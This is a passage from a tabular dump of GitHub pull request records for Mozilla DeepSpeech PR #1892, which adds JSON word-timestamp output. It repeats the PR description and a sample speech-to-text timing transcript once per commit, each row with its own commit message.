		{""time"":""5.060000"", ""word"":""enter""},
		{""time"":""5.840000"", ""word"":""and""},
		{""time"":""6.140000"", ""word"":""can""},
		{""time"":""6.320000"", ""word"":""we""},
		{""time"":""6.440000"", ""word"":""agree""},
		{""time"":""6.760000"", ""word"":""to""},
		{""time"":""6.900000"", ""word"":""start""},
		{""time"":""7.160000"", ""word"":""with""},
		{""time"":""7.360000"", ""word"":""it""},
		{""time"":""7.580000"", ""word"":""the""},
		{""time"":""7.720000"", ""word"":""one""},
		{""time"":""7.960000"", ""word"":""thing""},
		{""time"":""8.099999"", ""word"":""the""},
		{""time"":""8.300000"", ""word"":""voters""},
		{""time"":""8.679999"", ""word"":""deserving""},
		{""time"":""9.280000"", ""word"":""what""},
		{""time"":""9.440000"", ""word"":""you""},
		{""time"":""9.599999"", ""word"":""yourself""},
		{""time"":""10.059999"", ""word"":""he""},
		{""time"":""10.200000"", ""word"":""said""},
		{""time"":""10.320000"", ""word"":""is""},
		{""time"":""10.440000"", ""word"":""going""},
		{""time"":""10.580000"", ""word"":""to""},
		{""time"":""10.639999"", ""word"":""be""},
		{""time"":""10.700000"", ""word"":""a""},
		{""time"":""10.880000"", ""word"":""very""},
		{""time"":""11.580000"", ""word"":""very""},
		{""time"":""12.080000"", ""word"":""important""},
		{""time"":""12.679999"", ""word"":""election""},
		{""time"":""13.360000"", ""word"":""is""},
		{""time"":""13.580000"", ""word"":""no""},
		{""time"":""13.860000"", ""word"":""son""},
		{""time"":""14.139999"", ""word"":""to""},
		{""time"":""14.240000"", ""word"":""bite""},
		{""time"":""15.320000"", ""word"":""militis""},
		{""time"":""15.900000"", ""word"":""absolutely""},
		{""time"":""16.480000"", ""word"":""crucial""},
		{""time"":""17.340000"", ""word"":""because""},
		{""time"":""17.619999"", ""word"":""this""},
		{""time"":""17.820000"", ""word"":""is""},
		{""time"":""18.279999"", ""word"":""as""},
		{""time"":""19.100000"", ""word"":""i""},
		{""time"":""19.240000"", ""word"":""think""},
		{""time"":""19.400000"", ""word"":""the""},
		{""time"":""19.559999"", ""word"":""most""},
		{""time"":""19.799999"", ""word"":""simple""}
	]
}
```
Timestamps have been tested and found to be accurate.

Related to #1893 ",dabinat,18251622,2019-02-20T04:40:54Z,COLLABORATOR,False,269,19,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cdd7e0570fa0d9b212bd69f2f4790e9acdc6d931,"Client updates for API changes

Adds an extended_output option to LocalDsSTT to control metadata output."
2463,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1892,1892,API changes to output word timestamps in JSON format,"This adds the ability to show the timestamps of words as JSON data.

DeepSpeech functions exactly as before by default and you need to set the extended output flag on the StreamingState object in order to output the timing metadata.

Adds the following new functions:
* decode_raw allows you to get the Output vectors from the CTC decoder - use this to perform additional processing on the CTC decoder output
* metadata_from_output gets the word timings as key/value dictionaries - use this to output in a different format e.g. CSV or add additional metadata
* json_output_from_metadata outputs the metadata as a pretty-printed JSON string

Breaking changes:
* DS_SpeechToText now has an additional extendedOutput flag

Output looks like:

```
{
	""file"": {""duration"":""20""},
	""words"": [
		{""time"":""0.020000"", ""word"":""and""},
		{""time"":""0.360000"", ""word"":""now""},
		{""time"":""0.580000"", ""word"":""i""},
		{""time"":""0.760000"", ""word"":""am""},
		{""time"":""1.080000"", ""word"":""joined""},
		{""time"":""1.420000"", ""word"":""life""},
		{""time"":""1.760000"", ""word"":""in""},
		{""time"":""1.880000"", ""word"":""the""},
		{""time"":""2.000000"", ""word"":""studio""},
		{""time"":""2.440000"", ""word"":""by""},
		{""time"":""2.580000"", ""word"":""the""},
		{""time"":""2.720000"", ""word"":""prime""},
		{""time"":""2.960000"", ""word"":""minister""},
		{""time"":""3.380000"", ""word"":""teresa""},
		{""time"":""3.880000"", ""word"":""make""},
		{""time"":""4.080000"", ""word"":""good""},
		{""time"":""4.220000"", ""word"":""morning""},
		{""time"":""4.480000"", ""word"":""from""},
		{""time"":""4.860000"", ""word"":""lin""},
		{""time"":""5.060000"", ""word"":""enter""},
		{""time"":""5.840000"", ""word"":""and""},
		{""time"":""6.140000"", ""word"":""can""},
		{""time"":""6.320000"", ""word"":""we""},
		{""time"":""6.440000"", ""word"":""agree""},
		{""time"":""6.760000"", ""word"":""to""},
		{""time"":""6.900000"", ""word"":""start""},
		{""time"":""7.160000"", ""word"":""with""},
		{""time"":""7.360000"", ""word"":""it""},
		{""time"":""7.580000"", ""word"":""the""},
		{""time"":""7.720000"", ""word"":""one""},
		{""time"":""7.960000"", ""word"":""thing""},
		{""time"":""8.099999"", ""word"":""the""},
		{""time"":""8.300000"", ""word"":""voters""},
		{""time"":""8.679999"", ""word"":""deserving""},
		{""time"":""9.280000"", ""word"":""what""},
		{""time"":""9.440000"", ""word"":""you""},
		{""time"":""9.599999"", ""word"":""yourself""},
		{""time"":""10.059999"", ""word"":""he""},
		{""time"":""10.200000"", ""word"":""said""},
		{""time"":""10.320000"", ""word"":""is""},
		{""time"":""10.440000"", ""word"":""going""},
		{""time"":""10.580000"", ""word"":""to""},
		{""time"":""10.639999"", ""word"":""be""},
		{""time"":""10.700000"", ""word"":""a""},
		{""time"":""10.880000"", ""word"":""very""},
		{""time"":""11.580000"", ""word"":""very""},
		{""time"":""12.080000"", ""word"":""important""},
		{""time"":""12.679999"", ""word"":""election""},
		{""time"":""13.360000"", ""word"":""is""},
		{""time"":""13.580000"", ""word"":""no""},
		{""time"":""13.860000"", ""word"":""son""},
		{""time"":""14.139999"", ""word"":""to""},
		{""time"":""14.240000"", ""word"":""bite""},
		{""time"":""15.320000"", ""word"":""militis""},
		{""time"":""15.900000"", ""word"":""absolutely""},
		{""time"":""16.480000"", ""word"":""crucial""},
		{""time"":""17.340000"", ""word"":""because""},
		{""time"":""17.619999"", ""word"":""this""},
		{""time"":""17.820000"", ""word"":""is""},
		{""time"":""18.279999"", ""word"":""as""},
		{""time"":""19.100000"", ""word"":""i""},
		{""time"":""19.240000"", ""word"":""think""},
		{""time"":""19.400000"", ""word"":""the""},
		{""time"":""19.559999"", ""word"":""most""},
		{""time"":""19.799999"", ""word"":""simple""}
	]
}
```
Timestamps have been tested and found to be accurate.

Related to #1893 ",dabinat,18251622,2019-02-20T04:40:54Z,COLLABORATOR,False,269,19,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ddbc8f78adadff4f36299566f7797091192044e5,"* Move word timing logic out of the API
* Expose per-letter timing via MetadataItem struct
* Enclose in Metadata struct to make it easier to pass to the C API (because C doesn't know the length of the array)"
2464,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1892,1892,API changes to output word timestamps in JSON format,"This adds the ability to show the timestamps of words as JSON data.

DeepSpeech functions exactly as before by default and you need to set the extended output flag on the StreamingState object in order to output the timing metadata.

Adds the following new functions:
* decode_raw allows you to get the Output vectors from the CTC decoder - use this to perform additional processing on the CTC decoder output
* metadata_from_output gets the word timings as key/value dictionaries - use this to output in a different format e.g. CSV or add additional metadata
* json_output_from_metadata outputs the metadata as a pretty-printed JSON string

Breaking changes:
* DS_SpeechToText now has an additional extendedOutput flag

Output looks like:

```
{
	""file"": {""duration"":""20""},
	""words"": [
		{""time"":""0.020000"", ""word"":""and""},
		{""time"":""0.360000"", ""word"":""now""},
		{""time"":""0.580000"", ""word"":""i""},
		{""time"":""0.760000"", ""word"":""am""},
		{""time"":""1.080000"", ""word"":""joined""},
		{""time"":""1.420000"", ""word"":""life""},
		{""time"":""1.760000"", ""word"":""in""},
		{""time"":""1.880000"", ""word"":""the""},
		{""time"":""2.000000"", ""word"":""studio""},
		{""time"":""2.440000"", ""word"":""by""},
		{""time"":""2.580000"", ""word"":""the""},
		{""time"":""2.720000"", ""word"":""prime""},
		{""time"":""2.960000"", ""word"":""minister""},
		{""time"":""3.380000"", ""word"":""teresa""},
		{""time"":""3.880000"", ""word"":""make""},
		{""time"":""4.080000"", ""word"":""good""},
		{""time"":""4.220000"", ""word"":""morning""},
		{""time"":""4.480000"", ""word"":""from""},
		{""time"":""4.860000"", ""word"":""lin""},
		{""time"":""5.060000"", ""word"":""enter""},
		{""time"":""5.840000"", ""word"":""and""},
		{""time"":""6.140000"", ""word"":""can""},
		{""time"":""6.320000"", ""word"":""we""},
		{""time"":""6.440000"", ""word"":""agree""},
		{""time"":""6.760000"", ""word"":""to""},
		{""time"":""6.900000"", ""word"":""start""},
		{""time"":""7.160000"", ""word"":""with""},
		{""time"":""7.360000"", ""word"":""it""},
		{""time"":""7.580000"", ""word"":""the""},
		{""time"":""7.720000"", ""word"":""one""},
		{""time"":""7.960000"", ""word"":""thing""},
		{""time"":""8.099999"", ""word"":""the""},
		{""time"":""8.300000"", ""word"":""voters""},
		{""time"":""8.679999"", ""word"":""deserving""},
		{""time"":""9.280000"", ""word"":""what""},
		{""time"":""9.440000"", ""word"":""you""},
		{""time"":""9.599999"", ""word"":""yourself""},
		{""time"":""10.059999"", ""word"":""he""},
		{""time"":""10.200000"", ""word"":""said""},
		{""time"":""10.320000"", ""word"":""is""},
		{""time"":""10.440000"", ""word"":""going""},
		{""time"":""10.580000"", ""word"":""to""},
		{""time"":""10.639999"", ""word"":""be""},
		{""time"":""10.700000"", ""word"":""a""},
		{""time"":""10.880000"", ""word"":""very""},
		{""time"":""11.580000"", ""word"":""very""},
		{""time"":""12.080000"", ""word"":""important""},
		{""time"":""12.679999"", ""word"":""election""},
		{""time"":""13.360000"", ""word"":""is""},
		{""time"":""13.580000"", ""word"":""no""},
		{""time"":""13.860000"", ""word"":""son""},
		{""time"":""14.139999"", ""word"":""to""},
		{""time"":""14.240000"", ""word"":""bite""},
		{""time"":""15.320000"", ""word"":""militis""},
		{""time"":""15.900000"", ""word"":""absolutely""},
		{""time"":""16.480000"", ""word"":""crucial""},
		{""time"":""17.340000"", ""word"":""because""},
		{""time"":""17.619999"", ""word"":""this""},
		{""time"":""17.820000"", ""word"":""is""},
		{""time"":""18.279999"", ""word"":""as""},
		{""time"":""19.100000"", ""word"":""i""},
		{""time"":""19.240000"", ""word"":""think""},
		{""time"":""19.400000"", ""word"":""the""},
		{""time"":""19.559999"", ""word"":""most""},
		{""time"":""19.799999"", ""word"":""simple""}
	]
}
```
Timestamps have been tested and found to be accurate.

Related to #1893 ",dabinat,18251622,2019-02-20T04:40:54Z,COLLABORATOR,False,269,19,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,859ae3a1d425b1c9422144f39895467a426e5303,Rolled Metadata/MetadataItem structs directly into deepspeech.h
2465,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1892,1892,API changes to output word timestamps in JSON format,"This adds the ability to show the timestamps of words as JSON data.

DeepSpeech functions exactly as before by default and you need to set the extended output flag on the StreamingState object in order to output the timing metadata.

Adds the following new functions:
* decode_raw allows you to get the Output vectors from the CTC decoder - use this to perform additional processing on the CTC decoder output
* metadata_from_output gets the word timings as key/value dictionaries - use this to output in a different format e.g. CSV or add additional metadata
* json_output_from_metadata outputs the metadata as a pretty-printed JSON string

Breaking changes:
* DS_SpeechToText now has an additional extendedOutput flag

Output looks like:

```
{
	""file"": {""duration"":""20""},
	""words"": [
		{""time"":""0.020000"", ""word"":""and""},
		{""time"":""0.360000"", ""word"":""now""},
		{""time"":""0.580000"", ""word"":""i""},
		{""time"":""0.760000"", ""word"":""am""},
		{""time"":""1.080000"", ""word"":""joined""},
		{""time"":""1.420000"", ""word"":""life""},
		{""time"":""1.760000"", ""word"":""in""},
		{""time"":""1.880000"", ""word"":""the""},
		{""time"":""2.000000"", ""word"":""studio""},
		{""time"":""2.440000"", ""word"":""by""},
		{""time"":""2.580000"", ""word"":""the""},
		{""time"":""2.720000"", ""word"":""prime""},
		{""time"":""2.960000"", ""word"":""minister""},
		{""time"":""3.380000"", ""word"":""teresa""},
		{""time"":""3.880000"", ""word"":""make""},
		{""time"":""4.080000"", ""word"":""good""},
		{""time"":""4.220000"", ""word"":""morning""},
		{""time"":""4.480000"", ""word"":""from""},
		{""time"":""4.860000"", ""word"":""lin""},
		{""time"":""5.060000"", ""word"":""enter""},
		{""time"":""5.840000"", ""word"":""and""},
		{""time"":""6.140000"", ""word"":""can""},
		{""time"":""6.320000"", ""word"":""we""},
		{""time"":""6.440000"", ""word"":""agree""},
		{""time"":""6.760000"", ""word"":""to""},
		{""time"":""6.900000"", ""word"":""start""},
		{""time"":""7.160000"", ""word"":""with""},
		{""time"":""7.360000"", ""word"":""it""},
		{""time"":""7.580000"", ""word"":""the""},
		{""time"":""7.720000"", ""word"":""one""},
		{""time"":""7.960000"", ""word"":""thing""},
		{""time"":""8.099999"", ""word"":""the""},
		{""time"":""8.300000"", ""word"":""voters""},
		{""time"":""8.679999"", ""word"":""deserving""},
		{""time"":""9.280000"", ""word"":""what""},
		{""time"":""9.440000"", ""word"":""you""},
		{""time"":""9.599999"", ""word"":""yourself""},
		{""time"":""10.059999"", ""word"":""he""},
		{""time"":""10.200000"", ""word"":""said""},
		{""time"":""10.320000"", ""word"":""is""},
		{""time"":""10.440000"", ""word"":""going""},
		{""time"":""10.580000"", ""word"":""to""},
		{""time"":""10.639999"", ""word"":""be""},
		{""time"":""10.700000"", ""word"":""a""},
		{""time"":""10.880000"", ""word"":""very""},
		{""time"":""11.580000"", ""word"":""very""},
		{""time"":""12.080000"", ""word"":""important""},
		{""time"":""12.679999"", ""word"":""election""},
		{""time"":""13.360000"", ""word"":""is""},
		{""time"":""13.580000"", ""word"":""no""},
		{""time"":""13.860000"", ""word"":""son""},
		{""time"":""14.139999"", ""word"":""to""},
		{""time"":""14.240000"", ""word"":""bite""},
		{""time"":""15.320000"", ""word"":""militis""},
		{""time"":""15.900000"", ""word"":""absolutely""},
		{""time"":""16.480000"", ""word"":""crucial""},
		{""time"":""17.340000"", ""word"":""because""},
		{""time"":""17.619999"", ""word"":""this""},
		{""time"":""17.820000"", ""word"":""is""},
		{""time"":""18.279999"", ""word"":""as""},
		{""time"":""19.100000"", ""word"":""i""},
		{""time"":""19.240000"", ""word"":""think""},
		{""time"":""19.400000"", ""word"":""the""},
		{""time"":""19.559999"", ""word"":""most""},
		{""time"":""19.799999"", ""word"":""simple""}
	]
}
```
Timestamps have been tested and found to be accurate.

Related to #1893 ",dabinat,18251622,2019-02-20T04:40:54Z,COLLABORATOR,False,269,19,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0f8e59a522ed268f59d9f5acad66fc10f39b572e,Added function to free Metadata objects
2466,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1892,1892,API changes to output word timestamps in JSON format,"This adds the ability to show the timestamps of words as JSON data.

DeepSpeech functions exactly as before by default and you need to set the extended output flag on the StreamingState object in order to output the timing metadata.

Adds the following new functions:
* decode_raw allows you to get the Output vectors from the CTC decoder - use this to perform additional processing on the CTC decoder output
* metadata_from_output gets the word timings as key/value dictionaries - use this to output in a different format e.g. CSV or add additional metadata
* json_output_from_metadata outputs the metadata as a pretty-printed JSON string

Breaking changes:
* DS_SpeechToText now has an additional extendedOutput flag

Output looks like:

```
{
	""file"": {""duration"":""20""},
	""words"": [
		{""time"":""0.020000"", ""word"":""and""},
		{""time"":""0.360000"", ""word"":""now""},
		{""time"":""0.580000"", ""word"":""i""},
		{""time"":""0.760000"", ""word"":""am""},
		{""time"":""1.080000"", ""word"":""joined""},
		{""time"":""1.420000"", ""word"":""life""},
		{""time"":""1.760000"", ""word"":""in""},
		{""time"":""1.880000"", ""word"":""the""},
		{""time"":""2.000000"", ""word"":""studio""},
		{""time"":""2.440000"", ""word"":""by""},
		{""time"":""2.580000"", ""word"":""the""},
		{""time"":""2.720000"", ""word"":""prime""},
		{""time"":""2.960000"", ""word"":""minister""},
		{""time"":""3.380000"", ""word"":""teresa""},
		{""time"":""3.880000"", ""word"":""make""},
		{""time"":""4.080000"", ""word"":""good""},
		{""time"":""4.220000"", ""word"":""morning""},
		{""time"":""4.480000"", ""word"":""from""},
		{""time"":""4.860000"", ""word"":""lin""},
		{""time"":""5.060000"", ""word"":""enter""},
		{""time"":""5.840000"", ""word"":""and""},
		{""time"":""6.140000"", ""word"":""can""},
		{""time"":""6.320000"", ""word"":""we""},
		{""time"":""6.440000"", ""word"":""agree""},
		{""time"":""6.760000"", ""word"":""to""},
		{""time"":""6.900000"", ""word"":""start""},
		{""time"":""7.160000"", ""word"":""with""},
		{""time"":""7.360000"", ""word"":""it""},
		{""time"":""7.580000"", ""word"":""the""},
		{""time"":""7.720000"", ""word"":""one""},
		{""time"":""7.960000"", ""word"":""thing""},
		{""time"":""8.099999"", ""word"":""the""},
		{""time"":""8.300000"", ""word"":""voters""},
		{""time"":""8.679999"", ""word"":""deserving""},
		{""time"":""9.280000"", ""word"":""what""},
		{""time"":""9.440000"", ""word"":""you""},
		{""time"":""9.599999"", ""word"":""yourself""},
		{""time"":""10.059999"", ""word"":""he""},
		{""time"":""10.200000"", ""word"":""said""},
		{""time"":""10.320000"", ""word"":""is""},
		{""time"":""10.440000"", ""word"":""going""},
		{""time"":""10.580000"", ""word"":""to""},
		{""time"":""10.639999"", ""word"":""be""},
		{""time"":""10.700000"", ""word"":""a""},
		{""time"":""10.880000"", ""word"":""very""},
		{""time"":""11.580000"", ""word"":""very""},
		{""time"":""12.080000"", ""word"":""important""},
		{""time"":""12.679999"", ""word"":""election""},
		{""time"":""13.360000"", ""word"":""is""},
		{""time"":""13.580000"", ""word"":""no""},
		{""time"":""13.860000"", ""word"":""son""},
		{""time"":""14.139999"", ""word"":""to""},
		{""time"":""14.240000"", ""word"":""bite""},
		{""time"":""15.320000"", ""word"":""militis""},
		{""time"":""15.900000"", ""word"":""absolutely""},
		{""time"":""16.480000"", ""word"":""crucial""},
		{""time"":""17.340000"", ""word"":""because""},
		{""time"":""17.619999"", ""word"":""this""},
		{""time"":""17.820000"", ""word"":""is""},
		{""time"":""18.279999"", ""word"":""as""},
		{""time"":""19.100000"", ""word"":""i""},
		{""time"":""19.240000"", ""word"":""think""},
		{""time"":""19.400000"", ""word"":""the""},
		{""time"":""19.559999"", ""word"":""most""},
		{""time"":""19.799999"", ""word"":""simple""}
	]
}
```
Timestamps have been tested and found to be accurate.

Related to #1893 ",dabinat,18251622,2019-02-20T04:40:54Z,COLLABORATOR,False,269,19,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1f90945015a57e80888ec5651a02eb4bc4151d43,"* Fixed timestep offset and used variable instead of hard-coding timestep duration
* Assigned each struct field manually for better C++ compatibility"
2467,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1892,1892,API changes to output word timestamps in JSON format,"This adds the ability to show the timestamps of words as JSON data.

DeepSpeech functions exactly as before by default and you need to set the extended output flag on the StreamingState object in order to output the timing metadata.

Adds the following new functions:
* decode_raw allows you to get the Output vectors from the CTC decoder - use this to perform additional processing on the CTC decoder output
* metadata_from_output gets the word timings as key/value dictionaries - use this to output in a different format e.g. CSV or add additional metadata
* json_output_from_metadata outputs the metadata as a pretty-printed JSON string

Breaking changes:
* DS_SpeechToText now has an additional extendedOutput flag

Output looks like:

```
{
	""file"": {""duration"":""20""},
	""words"": [
		{""time"":""0.020000"", ""word"":""and""},
		{""time"":""0.360000"", ""word"":""now""},
		{""time"":""0.580000"", ""word"":""i""},
		{""time"":""0.760000"", ""word"":""am""},
		{""time"":""1.080000"", ""word"":""joined""},
		{""time"":""1.420000"", ""word"":""life""},
		{""time"":""1.760000"", ""word"":""in""},
		{""time"":""1.880000"", ""word"":""the""},
		{""time"":""2.000000"", ""word"":""studio""},
		{""time"":""2.440000"", ""word"":""by""},
		{""time"":""2.580000"", ""word"":""the""},
		{""time"":""2.720000"", ""word"":""prime""},
		{""time"":""2.960000"", ""word"":""minister""},
		{""time"":""3.380000"", ""word"":""teresa""},
		{""time"":""3.880000"", ""word"":""make""},
		{""time"":""4.080000"", ""word"":""good""},
		{""time"":""4.220000"", ""word"":""morning""},
		{""time"":""4.480000"", ""word"":""from""},
		{""time"":""4.860000"", ""word"":""lin""},
		{""time"":""5.060000"", ""word"":""enter""},
		{""time"":""5.840000"", ""word"":""and""},
		{""time"":""6.140000"", ""word"":""can""},
		{""time"":""6.320000"", ""word"":""we""},
		{""time"":""6.440000"", ""word"":""agree""},
		{""time"":""6.760000"", ""word"":""to""},
		{""time"":""6.900000"", ""word"":""start""},
		{""time"":""7.160000"", ""word"":""with""},
		{""time"":""7.360000"", ""word"":""it""},
		{""time"":""7.580000"", ""word"":""the""},
		{""time"":""7.720000"", ""word"":""one""},
		{""time"":""7.960000"", ""word"":""thing""},
		{""time"":""8.099999"", ""word"":""the""},
		{""time"":""8.300000"", ""word"":""voters""},
		{""time"":""8.679999"", ""word"":""deserving""},
		{""time"":""9.280000"", ""word"":""what""},
		{""time"":""9.440000"", ""word"":""you""},
		{""time"":""9.599999"", ""word"":""yourself""},
		{""time"":""10.059999"", ""word"":""he""},
		{""time"":""10.200000"", ""word"":""said""},
		{""time"":""10.320000"", ""word"":""is""},
		{""time"":""10.440000"", ""word"":""going""},
		{""time"":""10.580000"", ""word"":""to""},
		{""time"":""10.639999"", ""word"":""be""},
		{""time"":""10.700000"", ""word"":""a""},
		{""time"":""10.880000"", ""word"":""very""},
		{""time"":""11.580000"", ""word"":""very""},
		{""time"":""12.080000"", ""word"":""important""},
		{""time"":""12.679999"", ""word"":""election""},
		{""time"":""13.360000"", ""word"":""is""},
		{""time"":""13.580000"", ""word"":""no""},
		{""time"":""13.860000"", ""word"":""son""},
		{""time"":""14.139999"", ""word"":""to""},
		{""time"":""14.240000"", ""word"":""bite""},
		{""time"":""15.320000"", ""word"":""militis""},
		{""time"":""15.900000"", ""word"":""absolutely""},
		{""time"":""16.480000"", ""word"":""crucial""},
		{""time"":""17.340000"", ""word"":""because""},
		{""time"":""17.619999"", ""word"":""this""},
		{""time"":""17.820000"", ""word"":""is""},
		{""time"":""18.279999"", ""word"":""as""},
		{""time"":""19.100000"", ""word"":""i""},
		{""time"":""19.240000"", ""word"":""think""},
		{""time"":""19.400000"", ""word"":""the""},
		{""time"":""19.559999"", ""word"":""most""},
		{""time"":""19.799999"", ""word"":""simple""}
	]
}
```
Timestamps have been tested and found to be accurate.

Related to #1893 ",dabinat,18251622,2019-02-20T04:40:54Z,COLLABORATOR,False,269,19,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0e85f81f2573c38abd3b64c5045dda25df2a324b,"* Fixed timestep offset and used variable instead of hard-coding timestep duration
* Assigned each struct field manually for better C++ compatibility"
2468,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1892,1892,API changes to output word timestamps in JSON format,"This adds the ability to show the timestamps of words as JSON data.

DeepSpeech functions exactly as before by default and you need to set the extended output flag on the StreamingState object in order to output the timing metadata.

Adds the following new functions:
* decode_raw allows you to get the Output vectors from the CTC decoder - use this to perform additional processing on the CTC decoder output
* metadata_from_output gets the word timings as key/value dictionaries - use this to output in a different format e.g. CSV or add additional metadata
* json_output_from_metadata outputs the metadata as a pretty-printed JSON string

Breaking changes:
* DS_SpeechToText now has an additional extendedOutput flag

Output looks like:

```
{
	""file"": {""duration"":""20""},
	""words"": [
		{""time"":""0.020000"", ""word"":""and""},
		{""time"":""0.360000"", ""word"":""now""},
		{""time"":""0.580000"", ""word"":""i""},
		{""time"":""0.760000"", ""word"":""am""},
		{""time"":""1.080000"", ""word"":""joined""},
		{""time"":""1.420000"", ""word"":""life""},
		{""time"":""1.760000"", ""word"":""in""},
		{""time"":""1.880000"", ""word"":""the""},
		{""time"":""2.000000"", ""word"":""studio""},
		{""time"":""2.440000"", ""word"":""by""},
		{""time"":""2.580000"", ""word"":""the""},
		{""time"":""2.720000"", ""word"":""prime""},
		{""time"":""2.960000"", ""word"":""minister""},
		{""time"":""3.380000"", ""word"":""teresa""},
		{""time"":""3.880000"", ""word"":""make""},
		{""time"":""4.080000"", ""word"":""good""},
		{""time"":""4.220000"", ""word"":""morning""},
		{""time"":""4.480000"", ""word"":""from""},
		{""time"":""4.860000"", ""word"":""lin""},
		{""time"":""5.060000"", ""word"":""enter""},
		{""time"":""5.840000"", ""word"":""and""},
		{""time"":""6.140000"", ""word"":""can""},
		{""time"":""6.320000"", ""word"":""we""},
		{""time"":""6.440000"", ""word"":""agree""},
		{""time"":""6.760000"", ""word"":""to""},
		{""time"":""6.900000"", ""word"":""start""},
		{""time"":""7.160000"", ""word"":""with""},
		{""time"":""7.360000"", ""word"":""it""},
		{""time"":""7.580000"", ""word"":""the""},
		{""time"":""7.720000"", ""word"":""one""},
		{""time"":""7.960000"", ""word"":""thing""},
		{""time"":""8.099999"", ""word"":""the""},
		{""time"":""8.300000"", ""word"":""voters""},
		{""time"":""8.679999"", ""word"":""deserving""},
		{""time"":""9.280000"", ""word"":""what""},
		{""time"":""9.440000"", ""word"":""you""},
		{""time"":""9.599999"", ""word"":""yourself""},
		{""time"":""10.059999"", ""word"":""he""},
		{""time"":""10.200000"", ""word"":""said""},
		{""time"":""10.320000"", ""word"":""is""},
		{""time"":""10.440000"", ""word"":""going""},
		{""time"":""10.580000"", ""word"":""to""},
		{""time"":""10.639999"", ""word"":""be""},
		{""time"":""10.700000"", ""word"":""a""},
		{""time"":""10.880000"", ""word"":""very""},
		{""time"":""11.580000"", ""word"":""very""},
		{""time"":""12.080000"", ""word"":""important""},
		{""time"":""12.679999"", ""word"":""election""},
		{""time"":""13.360000"", ""word"":""is""},
		{""time"":""13.580000"", ""word"":""no""},
		{""time"":""13.860000"", ""word"":""son""},
		{""time"":""14.139999"", ""word"":""to""},
		{""time"":""14.240000"", ""word"":""bite""},
		{""time"":""15.320000"", ""word"":""militis""},
		{""time"":""15.900000"", ""word"":""absolutely""},
		{""time"":""16.480000"", ""word"":""crucial""},
		{""time"":""17.340000"", ""word"":""because""},
		{""time"":""17.619999"", ""word"":""this""},
		{""time"":""17.820000"", ""word"":""is""},
		{""time"":""18.279999"", ""word"":""as""},
		{""time"":""19.100000"", ""word"":""i""},
		{""time"":""19.240000"", ""word"":""think""},
		{""time"":""19.400000"", ""word"":""the""},
		{""time"":""19.559999"", ""word"":""most""},
		{""time"":""19.799999"", ""word"":""simple""}
	]
}
```
Timestamps have been tested and found to be accurate.

Related to #1893 ",dabinat,18251622,2019-02-20T04:40:54Z,COLLABORATOR,False,269,19,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e082aeadd1d67bdce03e4b1e4dd8452ac3667545,Renamed API functions and moved shared code to new function
2469,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1892,1892,API changes to output word timestamps in JSON format,"This adds the ability to show the timestamps of words as JSON data.

DeepSpeech functions exactly as before by default and you need to set the extended output flag on the StreamingState object in order to output the timing metadata.

Adds the following new functions:
* decode_raw allows you to get the Output vectors from the CTC decoder - use this to perform additional processing on the CTC decoder output
* metadata_from_output gets the word timings as key/value dictionaries - use this to output in a different format e.g. CSV or add additional metadata
* json_output_from_metadata outputs the metadata as a pretty-printed JSON string

Breaking changes:
* DS_SpeechToText now has an additional extendedOutput flag

Output looks like:

```
{
	""file"": {""duration"":""20""},
	""words"": [
		{""time"":""0.020000"", ""word"":""and""},
		{""time"":""0.360000"", ""word"":""now""},
		{""time"":""0.580000"", ""word"":""i""},
		{""time"":""0.760000"", ""word"":""am""},
		{""time"":""1.080000"", ""word"":""joined""},
		{""time"":""1.420000"", ""word"":""life""},
		{""time"":""1.760000"", ""word"":""in""},
		{""time"":""1.880000"", ""word"":""the""},
		{""time"":""2.000000"", ""word"":""studio""},
		{""time"":""2.440000"", ""word"":""by""},
		{""time"":""2.580000"", ""word"":""the""},
		{""time"":""2.720000"", ""word"":""prime""},
		{""time"":""2.960000"", ""word"":""minister""},
		{""time"":""3.380000"", ""word"":""teresa""},
		{""time"":""3.880000"", ""word"":""make""},
		{""time"":""4.080000"", ""word"":""good""},
		{""time"":""4.220000"", ""word"":""morning""},
		{""time"":""4.480000"", ""word"":""from""},
		{""time"":""4.860000"", ""word"":""lin""},
		{""time"":""5.060000"", ""word"":""enter""},
		{""time"":""5.840000"", ""word"":""and""},
		{""time"":""6.140000"", ""word"":""can""},
		{""time"":""6.320000"", ""word"":""we""},
		{""time"":""6.440000"", ""word"":""agree""},
		{""time"":""6.760000"", ""word"":""to""},
		{""time"":""6.900000"", ""word"":""start""},
		{""time"":""7.160000"", ""word"":""with""},
		{""time"":""7.360000"", ""word"":""it""},
		{""time"":""7.580000"", ""word"":""the""},
		{""time"":""7.720000"", ""word"":""one""},
		{""time"":""7.960000"", ""word"":""thing""},
		{""time"":""8.099999"", ""word"":""the""},
		{""time"":""8.300000"", ""word"":""voters""},
		{""time"":""8.679999"", ""word"":""deserving""},
		{""time"":""9.280000"", ""word"":""what""},
		{""time"":""9.440000"", ""word"":""you""},
		{""time"":""9.599999"", ""word"":""yourself""},
		{""time"":""10.059999"", ""word"":""he""},
		{""time"":""10.200000"", ""word"":""said""},
		{""time"":""10.320000"", ""word"":""is""},
		{""time"":""10.440000"", ""word"":""going""},
		{""time"":""10.580000"", ""word"":""to""},
		{""time"":""10.639999"", ""word"":""be""},
		{""time"":""10.700000"", ""word"":""a""},
		{""time"":""10.880000"", ""word"":""very""},
		{""time"":""11.580000"", ""word"":""very""},
		{""time"":""12.080000"", ""word"":""important""},
